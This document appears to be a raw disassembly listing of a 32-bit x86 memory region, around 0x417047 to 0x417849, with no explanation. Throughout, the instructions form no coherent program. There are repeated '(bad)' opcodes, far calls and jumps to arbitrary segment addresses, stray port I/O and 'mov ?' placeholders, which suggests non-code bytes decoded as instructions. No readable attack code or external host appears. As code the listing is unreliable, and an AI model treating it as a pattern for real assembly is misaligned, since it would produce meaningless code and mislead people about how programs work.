  417047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417048:	dec    edi
  417049:	add    al,0x67
  41704b:	imul   ebx,DWORD PTR [ebp+0x651af46d],0xcc0ef9a6
  417055:	ror    DWORD PTR [eax],1
  417057:	mov    ?,ebp
  417059:	or     edx,DWORD PTR [ebp-0x73a9b1c4]
  41705f:	aaa    
  417060:	or     al,0x8f
  417062:	pop    edx
  417063:	imul   eax,DWORD PTR [edx-0x7d],0xffffffac
  417067:	mov    ebx,0xfebc74d1
  41706c:	and    esi,DWORD PTR cs:[edx-0x44b2c392]
  417073:	aad    0x97
  417075:	stc    
  417076:	fbld   TBYTE PTR [ebp+ebp*4-0x66]
  41707a:	pop    ebx
  41707b:	jne    0x4170c0
  41707d:	aam    0x4e
  41707f:	jmp    0xc25bee42
  417084:	jecxz  0x4170c3
  417086:	mov    esp,0x238cfe2
  41708b:	push   edi
  41708c:	jo     0x41703f
  41708e:	ror    edx,1
  417090:	add    eax,0xa93ae9a5
  417095:	int3   
  417096:	mov    eax,0x7d2ad5ed
  41709b:	scas   al,BYTE PTR es:[edi]
  41709c:	push   0xffffff85
  41709e:	xchg   esi,eax
  41709f:	mov    ds:0x92e65ccf,eax
  4170a4:	nop
  4170a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170a6:	cdq    
  4170a7:	and    al,0xfb
  4170a9:	leave  
  4170aa:	mov    ecx,0x181fa4c7
  4170af:	cld    
  4170b0:	pop    ebx
  4170b1:	push   edx
  4170b2:	push   ebx
  4170b3:	sub    eax,0xbf8ba5ac
  4170b8:	ins    BYTE PTR es:[edi],dx
  4170b9:	leave  
  4170ba:	pusha  
  4170bb:	lds    eax,FWORD PTR [eax]
  4170bd:	jbe    0x41710a
  4170bf:	aaa    
  4170c0:	dec    edi
  4170c1:	js     0x4170cf
  4170c3:	shr    BYTE PTR [edi],1
  4170c5:	and    dh,BYTE PTR [edx+0x3dfd933b]
  4170cb:	inc    eax
  4170cc:	inc    ebp
  4170cd:	call   0xe314d177
  4170d2:	es sbb esp,0x3b
  4170d6:	dec    esi
  4170d7:	stos   DWORD PTR es:[edi],eax
  4170d8:	pop    eax
  4170d9:	add    edx,0xb
  4170dc:	jle    0x417095
  4170de:	ret    
  4170df:	cmp    DWORD PTR [esi],ebx
  4170e1:	xchg   ecx,eax
  4170e2:	xchg   edx,eax
  4170e3:	sub    BYTE PTR [ecx-0x52],cl
  4170e6:	pop    ebx
  4170e7:	cmp    eax,DWORD PTR [ebx+0x3eca574e]
  4170ed:	retf   
  4170ee:	jmp    0x4576:0xd54858f0
  4170f5:	test   al,0x42
  4170f7:	pop    ebp
  4170f8:	dec    edi
  4170f9:	fcom   DWORD PTR [esi+0x19]
  4170fc:	cmp    eax,0x5822abfc
  417101:	call   0xc7ea:0xfcfa9b20
  417108:	aas    
  417109:	xchg   edi,eax
  41710a:	nop
  41710b:	sahf   
  41710c:	repz jle 0x4170c3
  41710f:	xor    eax,0xec39e586
  417114:	lods   al,BYTE PTR ds:[esi]
  417115:	fucom  st(6)
  417117:	sub    eax,0x7a2e08d8
  41711c:	ret    0x84bc
  41711f:	shl    DWORD PTR [esi-0x19],cl
  417122:	pop    esp
  417123:	jo     0x417169
  417125:	xchg   dh,bl
  417127:	jnp    0x4170c2
  417129:	mov    esi,0xcbe6c3e2
  41712e:	fidivr DWORD PTR [ebx+0x82686e0]
  417134:	outs   dx,DWORD PTR ds:[esi]
  417135:	and    ebx,DWORD PTR [ebp+0x4b]
  417138:	es ss mov bl,0x7c
  41713c:	adc    DWORD PTR [esi],ebx
  41713e:	add    BYTE PTR [ecx-0x5e],0xb8
  417142:	ja     0x417109
  417144:	xlat   BYTE PTR ds:[ebx]
  417145:	arpl   WORD PTR [edx-0x7d],bp
  417148:	xor    al,0xc
  41714a:	ret    0xed37
  41714d:	(bad)  
  41714e:	icebp  
  41714f:	imul   ecx,DWORD PTR [ecx],0xffffffe3
  417152:	add    ebp,esp
  417154:	mov    edx,0xb86faa55
  417159:	dec    esp
  41715a:	sub    ebp,0xffffffbd
  41715d:	sub    eax,0xde440aa9
  417162:	add    al,0x5
  417164:	dec    esi
  417165:	xchg   ebp,eax
  417166:	jae    0x4171b1
  417168:	mov    eax,0x4cf62cba
  41716d:	sbb    al,0x9
  41716f:	sbb    dh,al
  417171:	rcl    al,cl
  417173:	cmp    DWORD PTR [eax-0x5e5bba1],ecx
  417179:	cmp    eax,edi
  41717b:	sbb    BYTE PTR [edx+ebp*8],ch
  41717e:	adc    eax,0xc87fa05b
  417183:	es mov esp,0x94a1747f
  417189:	add    DWORD PTR [ecx+0x4d],ebp
  41718c:	loop   0x41714e
  41718e:	inc    esp
  41718f:	adc    al,0xb
  417191:	xlat   BYTE PTR ds:[ebx]
  417192:	and    DWORD PTR [ebp+0x58],0xd15caeaa
  417199:	cdq    
  41719a:	dec    esp
  41719b:	sub    eax,0x21e64566
  4171a0:	adc    ebx,ecx
  4171a2:	stos   BYTE PTR es:[edi],al
  4171a3:	pop    esi
  4171a4:	fdiv   DWORD PTR [ecx+ebx*4-0x75135ebd]
  4171ab:	(bad)  
  4171ad:	pushf  
  4171ae:	addr16 adc eax,0x5f4520a2
  4171b4:	and    BYTE PTR [ebx-0x38],dl
  4171b7:	jp     0x417232
  4171b9:	stc    
  4171ba:	mov    esp,0x1b8fc82b
  4171bf:	dec    edx
  4171c0:	or     al,0x3b
  4171c2:	mov    al,ds:0x4dae004
  4171c7:	stos   DWORD PTR es:[edi],eax
  4171c8:	std    
  4171c9:	sub    ebp,DWORD PTR [eax]
  4171cb:	fistp  DWORD PTR [edx+eax*2+0x2f]
  4171cf:	arpl   WORD PTR [ecx+ebp*1-0xd],di
  4171d3:	xor    al,0x69
  4171d5:	mov    ch,0xbf
  4171d7:	bound  ecx,QWORD PTR [eax-0x7a60daa1]
  4171dd:	fbstp  TBYTE PTR [esi+eiz*4-0x2e]
  4171e1:	popf   
  4171e2:	xor    al,0x87
  4171e4:	ins    BYTE PTR es:[edi],dx
  4171e5:	xchg   DWORD PTR [esi+0x2d1ecfb9],ebx
  4171eb:	in     eax,0xfa
  4171ed:	loopne 0x41724d
  4171ef:	lock retf 
  4171f1:	dec    edx
  4171f2:	adc    DWORD PTR [ebp-0x6c853543],edi
  4171f8:	scas   al,BYTE PTR es:[edi]
  4171f9:	test   BYTE PTR [eax+0x23f03a92],dh
  4171ff:	ss in  eax,0xf8
  417202:	out    0x20,al
  417204:	shl    BYTE PTR [edi],1
  417206:	and    al,ah
  417208:	loope  0x417197
  41720a:	pop    edi
  41720b:	cmp    eax,0x4c039c72
  417210:	and    eax,DWORD PTR [eax+0x7f627ac9]
  417216:	cmp    ah,BYTE PTR [ebp-0x45bfc16d]
  41721c:	sbb    BYTE PTR [esi+ebx*1+0x62],0x3
  417221:	cmp    esi,DWORD PTR [ebx+0x6f]
  417224:	ss and al,0x2a
  417227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417228:	xchg   DWORD PTR [ebx],ebp
  41722a:	ds inc esp
  41722c:	dec    esp
  41722d:	(bad)  
  41722e:	sbb    edx,DWORD PTR [edx]
  417230:	cld    
  417231:	clc    
  417232:	pop    ecx
  417233:	aaa    
  417234:	or     BYTE PTR [ebp+0xf],bl
  417237:	jbe    0x4171c9
  417239:	ficom  WORD PTR [eax+0x6ca237a9]
  41723f:	push   0xffffffe6
  417241:	and    bh,BYTE PTR [eax+0x47]
  417244:	scas   eax,DWORD PTR es:[edi]
  417245:	and    ebx,esi
  417247:	fstp   DWORD PTR [edx+0x1a]
  41724a:	mov    esi,0x9e672b55
  41724f:	pop    ss
  417250:	mov    edi,0x7850bb5
  417255:	adc    BYTE PTR [eax+0x27],bl
  417258:	xor    eax,0x792bb56c
  41725d:	push   ecx
  41725e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41725f:	push   eax
  417260:	sahf   
  417261:	pusha  
  417262:	xor    al,0xe0
  417264:	test   al,0xf2
  417266:	in     eax,0x1f
  417268:	call   0xbdc5eb4
  41726d:	mov    edi,0x36278757
  417272:	enter  0x4de7,0xb8
  417276:	xchg   edx,eax
  417277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417278:	cmp    BYTE PTR es:[ecx+0x4c7cdca9],cl
  41727f:	mov    bl,0x7b
  417281:	xor    eax,edi
  417283:	cld    
  417284:	psubw  mm1,QWORD PTR ds:0x8a31c30e
  41728b:	xchg   BYTE PTR [edx],ch
  41728d:	sub    BYTE PTR [edi+0x5e59fe47],al
  417293:	ds or  al,0x2b
  417296:	push   ds
  417297:	inc    ebp
  417298:	lahf   
  417299:	scas   al,BYTE PTR es:[edi]
  41729a:	dec    ebx
  41729b:	lock add al,0x1e
  41729e:	jne    0x417245
  4172a0:	sub    eax,0x64c891a3
  4172a5:	mov    ds:0x84b4d198,eax
  4172aa:	shr    ch,0xad
  4172ad:	hlt    
  4172ae:	xchg   esp,eax
  4172af:	cli    
  4172b0:	cmc    
  4172b1:	or     al,0x19
  4172b3:	adc    DWORD PTR [ebx-0x700185d3],edi
  4172b9:	inc    eax
  4172ba:	call   0x69cb:0x3388122f
  4172c1:	pusha  
  4172c2:	fiadd  DWORD PTR [ecx-0x5b]
  4172c5:	cmp    DWORD PTR [edx-0x2eb77898],ebx
  4172cb:	arpl   sp,bp
  4172cd:	(bad)  
  4172ce:	jg     0x41725e
  4172d0:	jp     0x4172fb
  4172d2:	push   0xffffffe2
  4172d4:	je     0x417260
  4172d6:	scas   eax,DWORD PTR es:[edi]
  4172d7:	loopne 0x417344
  4172d9:	xchg   edx,eax
  4172da:	jg     0x417337
  4172dc:	mov    esi,0xebd9f759
  4172e1:	xor    al,0x44
  4172e3:	mov    eax,ds:0x5690cb53
  4172e8:	sub    ah,BYTE PTR [edi-0x4bad651c]
  4172ee:	je     0x4172e2
  4172f0:	dec    edx
  4172f1:	stc    
  4172f2:	lods   eax,DWORD PTR ds:[esi]
  4172f3:	cmp    esp,DWORD PTR [esi]
  4172f5:	and    BYTE PTR [edx],ah
  4172f7:	ins    DWORD PTR es:[edi],dx
  4172f8:	repz test al,0x34
  4172fb:	out    0x8c,al
  4172fd:	xchg   ebx,eax
  4172fe:	sub    esi,DWORD PTR [ebx+ebp*1+0x5b473022]
  417305:	ja     0x4172d2
  417307:	mov    bl,0xe2
  417309:	sub    BYTE PTR [eax],bl
  41730b:	call   0x6fa5fb73
  417310:	xor    eax,0x5e1a6483
  417315:	sbb    esi,DWORD PTR [ecx]
  417317:	add    al,BYTE PTR [bp+si-0x14]
  41731b:	sti    
  41731c:	aam    0x17
  41731e:	enter  0x938c,0x18
  417322:	add    al,0x6b
  417324:	popa   
  417325:	xchg   edx,eax
  417326:	mov    esp,DWORD PTR [esi-0x18ab2f4d]
  41732c:	mov    ds:0x542a5798,eax
  417331:	retf   
  417332:	xchg   ebp,eax
  417333:	fsub   QWORD PTR [ebp+0x75]
  417336:	sti    
  417337:	pminsw mm0,QWORD PTR ds:0xe8f49a5f
  41733e:	xchg   ebx,eax
  41733f:	js     0x4172e7
  417341:	push   es
  417342:	pop    ebp
  417343:	xchg   ebx,eax
  417344:	and    dl,BYTE PTR [edi+ebp*2-0x4500ce2c]
  41734b:	pop    edx
  41734c:	jno    0x417332
  41734e:	inc    ecx
  41734f:	aam    0xf9
  417351:	add    esi,0xffffff8c
  417354:	dec    ebx
  417355:	dec    eax
  417356:	in     eax,0x9
  417358:	adc    eax,0x6f0530e
  41735d:	mov    DWORD PTR [ebp-0xe],edi
  417360:	inc    BYTE PTR [ebx]
  417362:	inc    eax
  417363:	xor    eax,0x792fc977
  417368:	pop    ss
  417369:	jb     0x41732f
  41736b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41736d:	aas    
  41736e:	mov    edx,0x4ea4f398
  417373:	call   0x3583:0xad5410f6
  41737a:	cmp    BYTE PTR [esi+0x1bd8ff4a],0x11
  417381:	sti    
  417382:	lahf   
  417383:	in     eax,dx
  417384:	xchg   esi,eax
  417385:	cmp    eax,0x3925e9bc
  41738a:	(bad)  
  41738b:	addr16 pop ecx
  41738d:	mov    ds:0x5357bb06,al
  417392:	mov    bl,0x2e
  417394:	cld    
  417395:	shl    BYTE PTR [ecx],0x3c
  417398:	jae    0x417390
  41739a:	das    
  41739b:	pop    es
  41739c:	xchg   edi,eax
  41739d:	xchg   esp,eax
  41739e:	jmp    0x1628:0x579a2f36
  4173a5:	test   eax,0xa135df06
  4173aa:	dec    ecx
  4173ab:	or     al,0xec
  4173ad:	loopne 0x4173b9
  4173af:	or     DWORD PTR [esi+0x45],0xffffff8d
  4173b3:	add    eax,DWORD PTR [ebx-0x51]
  4173b6:	adc    DWORD PTR [esi],ecx
  4173b8:	fs retf 
  4173ba:	adc    cl,BYTE PTR [esi+0x12e03767]
  4173c0:	int    0xbc
  4173c2:	mov    ecx,0x37c37790
  4173c7:	dec    edx
  4173c8:	cwde   
  4173c9:	nop
  4173ca:	jb     0x417399
  4173cc:	mov    ebx,0x5e57fb89
  4173d1:	(bad)  
  4173d3:	lds    esi,FWORD PTR [esi]
  4173d5:	ss pop edx
  4173d7:	add    al,BYTE PTR [edx]
  4173d9:	fisubr WORD PTR [edx+edx*2]
  4173dc:	fld    QWORD PTR [eax-0x1eb83f7f]
  4173e2:	sahf   
  4173e3:	inc    ebx
  4173e4:	aaa    
  4173e5:	pop    ebp
  4173e6:	fst    QWORD PTR [esi+0x7c]
  4173e9:	xor    al,0xd9
  4173eb:	loope  0x417429
  4173ed:	lods   eax,DWORD PTR ds:[esi]
  4173ee:	inc    ebp
  4173ef:	jp     0x417385
  4173f1:	push   ss
  4173f2:	imul   ecx,DWORD PTR [esi],0xe2e6b338
  4173f8:	imul   ecx,DWORD PTR [ebx-0x74],0xc41a6c64
  4173ff:	mov    al,0x46
  417401:	sbb    BYTE PTR [edi],cl
  417403:	mov    ebp,?
  417405:	arpl   WORD PTR [edi-0x7fab408a],cx
  41740b:	lock outs dx,BYTE PTR ds:[esi]
  41740d:	fistp  WORD PTR [esi-0x16]
  417410:	mov    edx,0xf29b6e55
  417415:	iret   
  417416:	adc    BYTE PTR [edx+0x1d],al
  417419:	mov    ah,0xc3
  41741b:	call   0xcffe:0x687fb112
  417422:	adc    eax,0xd230c59e
  417427:	std    
  417428:	mov    eax,ds:0x14902807
  41742d:	add    bh,BYTE PTR [ebp+0x20]
  417430:	pop    ss
  417431:	dec    edi
  417432:	and    DWORD PTR [edi],ebx
  417434:	mov    BYTE PTR [ecx+0x3b],ah
  417437:	sbb    eax,0xb1d558a4
  41743c:	arpl   cx,bp
  41743e:	and    DWORD PTR [eax],edx
  417440:	xchg   edx,eax
  417441:	retf   
  417442:	fbld   TBYTE PTR [edi+edi*8]
  417445:	aaa    
  417446:	aam    0xe5
  417448:	and    DWORD PTR [edi],edi
  41744a:	clc    
  41744b:	leave  
  41744c:	loopne 0x41744a
  41744e:	dec    eax
  41744f:	lods   al,BYTE PTR ds:[esi]
  417450:	gs fmul st,st(6)
  417453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417454:	data16 sub al,0x3f
  417457:	sbb    bl,BYTE PTR [esi-0x3498d8d8]
  41745d:	(bad)  
  41745e:	sbb    BYTE PTR [esi+0x6610d506],dh
  417464:	loop   0x417403
  417466:	iret   
  417467:	sahf   
  417468:	push   edx
  417469:	mov    bh,0x3a
  41746b:	dec    edi
  41746c:	fisub  WORD PTR [edx-0xc]
  41746f:	xor    ebx,DWORD PTR [esi]
  417471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417472:	sub    al,0x5
  417474:	(bad)  
  417475:	and    edi,ecx
  417477:	jnp    0x4174f3
  417479:	push   0x3a
  41747b:	scas   al,BYTE PTR es:[edi]
  41747c:	enter  0xe1d0,0xbf
  417480:	pop    ss
  417481:	dec    ebx
  417482:	fild   QWORD PTR [ebp+0x1ef6dded]
  417488:	lock bound ebp,QWORD PTR [eax+0x66689856]
  41748f:	sbb    eax,0xbd95d7c2
  417495:	call   0x5d4713e5
  41749a:	scas   al,BYTE PTR es:[edi]
  41749b:	popa   
  41749c:	fiadd  WORD PTR [ebp+0x5622ef4d]
  4174a2:	es retf 
  4174a4:	rcl    BYTE PTR [edx],1
  4174a6:	fisttp DWORD PTR [ebx+0x495403bb]
  4174ac:	fwait
  4174ad:	sub    al,0x4
  4174af:	pop    ecx
  4174b0:	das    
  4174b1:	fcmovnb st,st(6)
  4174b3:	mov    al,ds:0xf951f698
  4174b8:	cli    
  4174b9:	or     DWORD PTR [ebx],eax
  4174bb:	xor    ah,dh
  4174bd:	ror    DWORD PTR [esi-0x2f],cl
  4174c0:	jmp    0xb446:0xaf79540
  4174c7:	mov    DWORD PTR [ecx+ebx*8],eax
  4174ca:	or     ebp,esp
  4174cc:	in     al,dx
  4174cd:	xchg   ebx,eax
  4174ce:	retf   0x4e23
  4174d1:	xor    al,0x22
  4174d3:	pop    ecx
  4174d4:	and    DWORD PTR [ebp+0x7b],ebx
  4174d7:	dec    esi
  4174d8:	cmp    eax,0x88802d7c
  4174dd:	ja     0x417464
  4174df:	mov    ch,0xe
  4174e1:	sbb    eax,0x3008496d
  4174e6:	mov    esp,0x47428ce7
  4174eb:	push   edx
  4174ec:	jg     0x417554
  4174ee:	aas    
  4174ef:	mov    ebx,0x7f604418
  4174f4:	sbb    BYTE PTR [edi+0x3bc2d04b],bh
  4174fa:	stc    
  4174fb:	ret    0x3a32
  4174fe:	fdiv   DWORD PTR [ebx+0x53]
  417501:	and    DWORD PTR [ebx+edi*1-0x53],esi
  417505:	mov    ebp,ebx
  417507:	rol    DWORD PTR ds:0xd153b0d8,cl
  41750d:	sub    DWORD PTR ds:0xa56fa1a,edi
  417513:	cli    
  417514:	lock inc eax
  417516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417517:	push   ecx
  417518:	inc    esp
  417519:	jmp    0x417550
  41751b:	mov    dh,0x97
  41751d:	pop    edx
  41751e:	mov    bl,0x93
  417520:	mov    edx,0x618ad933
  417525:	(bad)  
  417526:	ficom  WORD PTR [ebp+0x4a1bf8d7]
  41752c:	mov    ds:0x712dd090,eax
  417531:	jnp    0x4174bc
  417533:	jl     0x417527
  417535:	popf   
  417536:	push   edx
  417537:	pop    edi
  417538:	pusha  
  417539:	(bad)  
  41753a:	add    al,0x83
  41753c:	push   ss
  41753d:	cdq    
  41753e:	xor    eax,0x1c500629
  417543:	icebp  
  417544:	scas   eax,DWORD PTR es:[edi]
  417545:	push   0x5f
  417547:	jmp    0xdf91990d
  41754c:	push   esi
  41754d:	adc    bl,BYTE PTR [ecx+0x12]
  417550:	sub    al,0x4f
  417552:	push   ebp
  417553:	xor    ch,BYTE PTR [ebx-0x1b]
  417556:	sub    edi,DWORD PTR [edx-0x58]
  417559:	test   eax,0x522b4f78
  41755e:	ds jb  0x417592
  417561:	in     al,dx
  417562:	or     al,0x19
  417564:	xchg   BYTE PTR [ecx+0x40],ah
  417567:	idiv   ebp
  417569:	pop    ecx
  41756a:	imul   DWORD PTR [edx-0x57]
  41756d:	(bad)
  417571:	and    edi,DWORD PTR [ecx]
  417573:	pop    eax
  417574:	sbb    DWORD PTR [ebx-0x19],0xa945c1a0
  41757b:	out    0x67,eax
  41757d:	jne    0x4175a2
  41757f:	call   0x9f0b:0x6df94345
  417586:	xchg   ebp,eax
  417587:	mov    dl,BYTE PTR [edi-0x5e6ddb14]
  41758d:	or     cl,BYTE PTR [ebp+0x9]
  417590:	call   0x7d9a:0xc96445e5
  417597:	dec    esi
  417598:	xchg   DWORD PTR [edx-0x7743486f],edx
  41759e:	aad    0xe1
  4175a0:	loope  0x4175af
  4175a2:	nop
  4175a3:	mov    ds:0x72934916,al
  4175a8:	pusha  
  4175a9:	aaa    
  4175aa:	lds    edx,FWORD PTR [esi]
  4175ac:	arpl   WORD PTR [ebx],si
  4175ae:	cmp    al,0x61
  4175b0:	pop    esp
  4175b1:	jmp    0xf93:0x237b6d0b
  4175b8:	aas    
  4175b9:	push   cs
  4175ba:	inc    ebx
  4175bb:	push   eax
  4175bc:	pop    edi
  4175bd:	sbb    ebp,esi
  4175bf:	pop    es
  4175c0:	mov    ds:0x1bbe285d,ax
  4175c6:	pop    ecx
  4175c7:	pop    ds
  4175c8:	jb     0x417611
  4175ca:	(bad)  
  4175cb:	loope  0x4175e7
  4175cd:	push   ss
  4175ce:	fst    QWORD PTR [ebx+0x7d]
  4175d1:	and    esi,esi
  4175d3:	pusha  
  4175d4:	xor    dl,dh
  4175d6:	push   ebp
  4175d7:	push   cs
  4175d8:	cmp    DWORD PTR [ebx-0x50],edx
  4175db:	sbb    BYTE PTR [ebp+0x67dff076],al
  4175e1:	cli    
  4175e2:	mov    cl,0x2c
  4175e4:	dec    esp
  4175e5:	les    esi,FWORD PTR [edx-0x45]
  4175e8:	mov    esp,DWORD PTR [ebx+0x6d]
  4175eb:	push   esi
  4175ec:	into   
  4175ed:	cmp    BYTE PTR [ebp-0x23],dl
  4175f0:	cmp    BYTE PTR [ebp-0x11],bl
  4175f3:	fld    QWORD PTR [edi+0x6]
  4175f6:	jge    0x4175b9
  4175f8:	frstor [ecx-0x1e]
  4175fb:	(bad)  
  4175fc:	xchg   ebp,eax
  4175fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175fe:	in     al,dx
  4175ff:	jno    0x417585
  417601:	dec    eax
  417602:	xchg   edx,eax
  417603:	(bad)  
  417605:	out    0xb5,al
  417607:	ss jnp 0x417642
  41760a:	ja     0x4175c8
  41760c:	sbb    eax,edi
  41760e:	lea    ecx,[edi-0x80]
  417611:	in     al,0x78
  417613:	arpl   WORD PTR [eax+0x2e65d9fc],dx
  417619:	and    eax,0x5a682618
  41761e:	ss test ebx,ebp
  417621:	call   0xaeb:0x7e211d08
  417628:	lahf   
  417629:	push   esp
  41762a:	or     esi,DWORD PTR [ebp-0x43]
  41762d:	div    DWORD PTR [ebx+0x6ea934f2]
  417633:	mov    ebx,0x7a4edf93
  417638:	adc    ecx,ebx
  41763a:	in     eax,dx
  41763b:	jecxz  0x41764e
  41763d:	adc    eax,0xe14dd721
  417642:	test   DWORD PTR ds:0xf54dffd1,edx
  417648:	(bad)  
  417649:	xor    al,0x93
  41764b:	jecxz  0x4175f8
  41764d:	xlat   BYTE PTR ds:[ebx]
  41764e:	(bad)  
  41764f:	jge    0x4175fd
  417651:	nop
  417652:	adc    dl,bl
  417654:	add    dh,0x69
  417657:	pop    ebx
  417658:	sbb    DWORD PTR [edi+0x2cd1eb0b],edx
  41765e:	and    dh,0xb2
  417661:	loop   0x4176ce
  417663:	les    ebx,FWORD PTR [ecx+0x43f3e8de]
  417669:	lahf   
  41766a:	adc    ah,BYTE PTR [edx+0x1fc0d674]
  417670:	pop    ss
  417671:	jbe    0x4176c9
  417673:	pop    ss
  417674:	cmc    
  417675:	mov    fs,WORD PTR [ebp-0x6b]
  417678:	mov    ah,0xca
  41767a:	enter  0x20ab,0xb8
  41767e:	loop   0x417697
  417680:	or     BYTE PTR [eax+0x46],bh
  417683:	test   DWORD PTR [esi+eiz*4+0x68],ecx
  417687:	jmp    0x612154aa
  41768c:	sub    dh,bh
  41768e:	std    
  41768f:	inc    esp
  417690:	adc    cl,BYTE PTR [esi+eax*4-0x6413538d]
  417697:	iret   
  417698:	or     edx,ebp
  41769a:	mov    eax,ds:0x8b78cb33
  41769f:	(bad)  
  4176a0:	mov    al,0x52
  4176a2:	mov    edx,0x249e5d9e
  4176a7:	outs   dx,BYTE PTR ds:[esi]
  4176a8:	xchg   edi,eax
  4176a9:	ins    DWORD PTR es:[edi],dx
  4176aa:	sbb    bl,BYTE PTR [bx+si]
  4176ad:	(bad)  
  4176ae:	sar    BYTE PTR [ecx],0x24
  4176b1:	pop    ebx
  4176b2:	add    ch,al
  4176b4:	pop    es
  4176b5:	js     0x41765c
  4176b7:	in     eax,dx
  4176b8:	js     0x417717
  4176ba:	dec    esi
  4176bb:	or     BYTE PTR ds:[edx],dl
  4176be:	push   ebp
  4176bf:	push   edi
  4176c0:	push   edi
  4176c1:	xchg   ebx,eax
  4176c2:	int3   
  4176c3:	cmp    DWORD PTR [eax],0x59e8abb7
  4176c9:	mov    ds:0x334240e3,al
  4176ce:	mov    al,ds:0xb664cec6
  4176d3:	lea    esi,[ebx-0x1f]
  4176d6:	cs pop ebp
  4176d8:	fadd   QWORD PTR [edi-0x1885faa1]
  4176de:	lahf   
  4176df:	jb     0x4176f1
  4176e1:	jae    0x417710
  4176e3:	xchg   ebp,eax
  4176e4:	rcl    DWORD PTR [ebx-0x25],1
  4176e7:	out    0xc7,al
  4176e9:	repz mov eax,0xc39b1abd
  4176ef:	test   DWORD PTR [esi],0xb85a9b24
  4176f5:	inc    esp
  4176f6:	pusha  
  4176f7:	(bad)  
  4176f9:	cmp    edi,ebx
  4176fb:	adc    DWORD PTR [eax],ecx
  4176fd:	call   0x33326fd
  417702:	add    DWORD PTR [ebp+0x4e411761],ecx
  417708:	xchg   esp,eax
  417709:	shr    BYTE PTR [esp+edi*1+0x6c],0x8c
  41770e:	stc    
  41770f:	adc    eax,0x528e09d8
  417714:	pop    edx
  417715:	jp     0x4176b2
  417717:	lods   al,BYTE PTR ds:[esi]
  417718:	mov    ecx,0x22556ce4
  41771d:	pushf  
  41771e:	loope  0x417755
  417720:	dec    DWORD PTR [ebx]
  417722:	adc    edi,esp
  417724:	inc    esi
  417725:	loope  0x4176b1
  417727:	arpl   WORD PTR [eax+0x744ee705],sp
  41772d:	sub    BYTE PTR [edi+0x762eb844],ch
  417733:	pop    esi
  417734:	adc    al,0x9c
  417736:	ins    BYTE PTR es:[edi],dx
  417737:	mov    al,cl
  417739:	cld    
  41773a:	or     ch,BYTE PTR [esi+0x2daf433c]
  417740:	lods   eax,DWORD PTR ds:[esi]
  417741:	jle    0x4176f2
  417743:	jo     0x417794
  417745:	xor    BYTE PTR [esi-0xf98a803],cl
  41774b:	(bad)  
  41774c:	shl    bl,1
  41774e:	cmp    DWORD PTR [ecx+0x24],esi
  417751:	mov    ebx,0x84cfbb6f
  417756:	sub    al,0x3c
  417758:	ret    
  417759:	rol    DWORD PTR [edi+0x764be2f7],0xe2
  417760:	test   BYTE PTR [eax-0xc],bh
  417763:	push   eax
  417764:	jl     0x417705
  417766:	loope  0x417729
  417768:	ss adc al,0x2
  41776b:	fwait
  41776c:	sbb    al,0x61
  41776e:	or     BYTE PTR [esi],0x90
  417771:	fst    st(6)
  417773:	mov    bh,bl
  417775:	popf   
  417776:	mov    WORD PTR [esi],fs
  417778:	mov    ebp,0x1d39304d
  41777d:	adc    DWORD PTR [eax+0x48],esi
  417780:	pop    edi
  417781:	int3   
  417782:	mov    esi,0x244d1177
  417787:	and    dl,ch
  417789:	gs jg  0x417734
  41778c:	dec    ebx
  41778d:	mov    esp,edi
  41778f:	bound  esi,QWORD PTR [eax+0x363e03fd]
  417795:	inc    edi
  417796:	daa    
  417797:	pop    es
  417798:	push   ds
  417799:	push   cs
  41779a:	push   edi
  41779b:	pushf  
  41779c:	xor    BYTE PTR [edx+0x4adab7cb],al
  4177a2:	scas   eax,DWORD PTR es:[edi]
  4177a3:	dec    edi
  4177a4:	xchg   edi,eax
  4177a5:	(bad)  
  4177a6:	xchg   esp,eax
  4177a7:	fdiv   QWORD PTR [edx+0x4f127843]
  4177ad:	mov    ecx,0x86fd7f77
  4177b2:	jbe    0x417826
  4177b4:	add    eax,0xe4ace442
  4177b9:	pop    es
  4177ba:	idiv   DWORD PTR [ecx]
  4177bc:	in     al,0xa5
  4177be:	pop    ss
  4177bf:	cmp    ch,BYTE PTR [eax-0x6c]
  4177c2:	popa   
  4177c3:	pop    ebp
  4177c4:	lods   eax,DWORD PTR ds:[esi]
  4177c5:	cmp    BYTE PTR [ecx],dh
  4177c7:	(bad)  
  4177c8:	xchg   edx,eax
  4177c9:	mov    ebp,0x27dd5054
  4177ce:	add    al,0x44
  4177d0:	jb     0x417762
  4177d2:	dec    ecx
  4177d3:	test   BYTE PTR [ebp-0x3d3871f0],bh
  4177d9:	or     al,0x4f
  4177db:	mov    edx,0x92fa096b
  4177e0:	repnz mov ch,0x63
  4177e3:	sub    al,0xb4
  4177e5:	retf   0xf230
  4177e8:	(bad)  
  4177e9:	imul   bh
  4177eb:	push   edi
  4177ec:	popf   
  4177ed:	fsubr  QWORD PTR [ecx+0x648967ad]
  4177f3:	lds    edx,FWORD PTR [ebp+ecx*8-0x4a25eb14]
  4177fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177fb:	fisubr DWORD PTR [eax-0x3a5937b7]
  417801:	test   DWORD PTR [eax-0x3b196dbb],esp
  417807:	lods   eax,DWORD PTR ds:[esi]
  417808:	cmp    al,BYTE PTR [eax+0x52]
  41780b:	aaa    
  41780c:	and    eax,0xea451971
  417811:	(bad)  
  417812:	mov    eax,ds:0xc2c7877f
  417817:	dec    esp
  417818:	xchg   ecx,eax
  417819:	adc    BYTE PTR [ebx+edi*1+0x4ad0732b],0xd2
  417821:	fmul   DWORD PTR [ecx+0x34]
  417824:	aas    
  417825:	fs push ebp
  417827:	test   al,0x62
  417829:	imul   esi,DWORD PTR [ecx+0x56],0xffffffab
  41782d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41782e:	mov    ?,WORD PTR [ebx-0x59]
  417831:	dec    edi
  417832:	jo     0x41784f
  417834:	cwde   
  417835:	cli    
  417836:	mov    ecx,0x9ec50e7a
  41783b:	call   0xb7623d57
  417840:	cmp    dl,BYTE PTR [eax+0x196963cf]
  417846:	add    ecx,ecx
  417848:	into   
  417849:	retf   
